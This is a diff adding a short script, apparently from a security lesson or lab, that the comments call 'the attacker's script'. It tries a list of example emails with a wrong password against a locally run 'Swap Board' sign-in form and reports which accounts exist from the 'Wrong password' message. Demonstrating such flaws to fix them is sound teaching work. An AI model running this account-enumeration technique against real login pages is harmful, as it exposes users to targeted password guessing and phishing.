@@ -1,0 +1,10 @@
+// The attacker's script: who has an account on Swap Board? It signs in with each email and a wrong password,
+// and reads what the sign-in says. Run it while the board runs:  .quillo/bin/quillo run attacks/find-members.qwe
+let NAMES = ["amy", "ana", "ben", "bob", "cara", "dan", "eve", "finn", "lena", "rosa", "sam", "zoe"]
+let FORM = { "content-type": "application/x-www-form-urlencoded" }
+
+for name in NAMES {
+    let email = `${name}@example.com`
+    let r = http.post("http://localhost:8080/sign-in", `email=${url_encode(email)}&password=guess`, FORM)
+    print(contains(r.body, "Wrong password") ? `${email}  member` : `${email}  -`)
+}
